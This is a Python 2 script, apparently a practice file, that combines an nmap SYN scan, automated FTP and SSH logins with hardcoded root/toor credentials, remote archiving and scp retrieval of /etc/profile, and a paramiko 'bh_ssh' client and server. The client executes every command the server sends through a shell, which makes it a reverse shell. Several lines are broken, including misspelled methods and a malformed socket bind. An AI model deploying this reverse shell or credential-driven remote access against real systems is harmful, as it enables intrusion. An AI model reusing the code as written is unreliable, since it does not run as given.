#!/usr/bin/env python

from __future__ import unicode_literals
import sys
import nmap
import pxssh
import socket
import getpass
import pexpect
import paramiko
import threading
import subprocess
from netaddr import IPNetwork,IPAddress


host_key = paramiko.RSAKey(filename='test_rsa.key')


def nmap_scan(host, port):
    try:
        nm = nmap.PortScanner()
    except nmap.PortScannerError:
        print('Nmap not found! ', sys.exc_info()[0])
        sys.exit(0)
    except:
        print("Unexpected error: ", sys.exc_info()[0])
        sys.exit(0)

    try:
        nm.scan(hosts=host, arguments=' -v -sS -p %s' %(port))
    except Exception, e:
        print "Scan error: " + str(e)

    for host in nm.all_hosts():
        print('ScanHost: %s (%s)\t%s' % (host, nm[host].hostname(), nm[host].state()))
        for proto in nm[host].all_protocols():
            lport = nm[host][proto].keys()
            lport.sort() 
            for port in lport:
                print('\tprotocol: %s\tport: %s\tstate: %s' % (proto, port, nm[host][proto][port]['state']))


def pexpect_ftp():
    child = pexpect.spawnu('ftp ftp.openbsd.org')
    child.expect('(?i)name .*: ')
    child.sendline('anonymous')
    child.expect('(?i)password')
    child.sendline('pexpect@sourceforge.net')
    child.expect('ftp> ')
    child.sendline('bin')
    child.expect('ftp> ')
    child.sendline('get robots.txt')
    child.expect('ftp> ')
    sys.stdout.write (child.before)
    print("Escape character is '^]'.\n")
    sys.stdout.write (child.after)
    sys.stdout.flush()
    child.interact()
    child.sendline('bye')
    child.close()


def pxssh_ssh(hostname, username, password):
    try:
        s = pxssh.pxssh()
        s.login(hostname, username, password)
        cmdstrs  = raw_input('CMD: ')
        s.sendline(cmdstrs) 
        s.prompt() 
        print s.before
        s.logout()
    except pxssh.ExceptionPxssh, e:
        s.sendeof()
        s.sendcontrol('c')
        print "pxssh login failed: %s." + str(e)


def pexpect_ssh(hostname, username, password):
    target_file="/etc/profile"

    child = pexpect.spawn('/usr/bin/ssh', [username+'@'+hostname])
    fout = file('/tmp/pexpect_log.txt', 'w')
    child.logfile = fout
    try:
        child.expect('(?i)password')
        child.sendline(password)
        child.expect('#')
        child.sendline('tar -czf /tmp/profile.tgz %s' %target_file)
        child.expect('#')
        print child.before
        child.sendline('exit')
        fout.close()
    except EOF:
        print "expect EOF"
    except TIMEOUT:
        print "expect TIMEOUT"

    child = pexpect.spawn('/usr/bin/scp', [username+'@'+hostname+':/tmp/profile.tgz', '/home'])
    fout = file('/tmp/pexpect_log.txt', 'a')
    child.logfile = fout
    try:
        child.expect('(?i)password')
        child.sendline(password)
        #run('/usr/bin/scp %s@%s:/tmp/profile.tgz /home' %(username, hostname), events={'(?i)password': password})
        child.expect(pexpect.EOF)
    except EOF:
        print "expect EOF"
    except TIMEOUT:
        print "expect TIMEOUT"


def ssh_client(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/root/.ssh/authorized_key')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        print ssh_session.recv(1024)
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))
        client.close() 
    return


class ssh_server(paramiko.ServerInterface):
    def _int_(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == 'root') and (password == 'toor'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


def conn_client():
    nmap_scan("127.0.0.1", "21,22")
    pexpect_ftp()
    ssh_client('127.0.0.1', 'root', 'toor', 'id')
    pxssh_ssh('127.0.0.1', 'root', 'toor') 
    pexpect_ssh('127.0.0.1', 'root', 'toor')


if __name__ == '__main__':
    server = sys.argv[1]
    ssh_port = int(sys.argv[2])

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsocket(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(server, ssh_port)
        sock.listen(100)
        print '[+] Listening for connection ...'
        client, addr = sock.accept()
    except Exception, e:
        print '[-] Listen failed: ' + str(e)
        sys.exit(-1)
    print '[+] Got a connection!'

    try:
        bhSession = paramiko.Transport(client)
        bhSession.add_server_ley(host_ley)
        server = ssh_server()
        try:
            bhSession.start_server(server=server)
        except paramiko.SSHException, x:
            print '[-] SSH negotiation failed.' 
        chan = bhSession.accept(20)
        print '[+] Authenticated!'
        print chan.recv(1024)
        chan.send('Welcome to bh_ssh')
        while True:
            try:
                command = raw_input("Enter command: ").strip('\n')
                if command != 'exit':
                    chan.send(command)
                    print chan.recv(1024) + '\n'
                else:
                    chan.send('exit')
                    print 'exiting'
                    bhSession.close()
                    raise Exception('exit')
            except KeyboardInterrupt:
                bhSession.close()
    except Exception, e:
        print '[-] Caught exception: ' + str(e)
        try:
            bhSession.close()
        except:
            pass
        sys.exit(1)
            
